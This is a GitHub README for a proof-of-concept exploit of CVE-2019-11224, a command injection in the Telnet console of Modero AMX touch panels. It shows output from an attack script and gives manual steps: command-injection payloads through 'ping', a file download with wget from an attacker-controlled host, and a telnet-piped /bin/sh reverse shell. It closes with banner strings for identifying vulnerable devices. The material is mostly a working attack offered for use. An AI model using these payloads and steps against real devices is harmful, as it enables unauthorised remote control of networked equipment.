# Modero AMX Code Execution (CVE-2019-11224)
This repo contains a few sources about CVE-2019–11224 (https://link.medium.com/zukA0oCnV8) because I noticed that the link no longer works on the official NIST website. 
Modero AMX devices are essentially touch panel devices for meeting rooms, they can be observed in a lot of different environments and usually have Telnet open. 
Because they emulate a less-than-ideal console using Telnet, there exists a code injection vulnerability through the "ping" function by using command separators.<br><br>
Since orignally creating this GitHub repo and poking on AMX devices, I've created a POC and exploit process to get reverse shells with this vulnerability. Hopefully it brings you joy :} 


# :turtle: Getting Shells with amx_pwn.py
I've written a POC `amx_pwn.py` that should be helpful. Example output below:<br>
```
┌──(cozyfox㉿submarine)-[/CVE-2019-11224]
└─$ python3 amx_pwn.py -t 192.168.0.21 -fs 192.168.0.41 -fn something.jpg -v 1
[!] Your current settings are:
[*] Target: 192.168.0.21
[*] FileServer and Filename URL: http://192.168.0.41/something.jpg
[*] Verbosity: 1
(^_^)7  Continue? (Y/N): y
[*] RUNNING
Telnet(192.168.0.21,23): recv b'\xff\xfb\x01\r\nWelcome to Modero v2.86.50 Copyright (C) AMX '
Telnet(192.168.0.21,23): IAC WILL 1
Telnet(192.168.0.21,23): recv b'LLC 2002-2009\r\n>'
b'\r\nWelcome to Modero v2.86.50 Copyright (C) AMX LLC 2002-2009\r\n>'
Telnet(192.168.0.21,23): send b"ping ;CMD=$'\\x20-o\\x20remount,rw\\x20/'&&mount$CMD\r\n"
Telnet(192.168.0.21,23): recv b'\xff\xfc\x01'
Telnet(192.168.0.21,23): IAC WONT 1
<..cut to remove clutter...>
Telnet(192.168.0.21,23): recv b'\xff\xfc\x01'
Telnet(192.168.0.21,23): IAC WONT 1
taking a snooze
Telnet(192.168.0.21,23): send b"ping ;CMD=$'\\x20http://192.168.0.41/something.jpg'&&wget$CMD\r\n"
taking a snooze
...
```
## Steps to perform this manually can be seen below:
- Remount the file system as R/W:<br>
`ping ;CMD=$'\x20-o\x20remount,rw\x20/'&&mount$CMD`<br>
- Host a file accessible to the device - The contents should be as follows:<br>
  Note: You need two netcat listeners, one will be for input, the other output.<br>
`telnet {YOUR_IP} 1332 | /bin/sh | telnet {YOUR_IP} 1333`<br>
- Download your file - NOTE: This should be an IP and served over HTTP. These devices are old.<br>
`ping ;CMD=$'\x20http://{YOUR_SYSTEM}/{YOUR_FILE}'&&wget$CMD`<br>
- Execute your file and catch shells:<br>
`ping ;CMD=$'\x20{YOUR_FILE}'&&/bin/sh$CMD`

# 👁️ Identifying the Modero AMX Service
Check for Telnet banners (typically port 23) containing:
`Welcome to Modero:` or `Copyright (C) AMX LLC`. Look for versions prior to 2.87.13
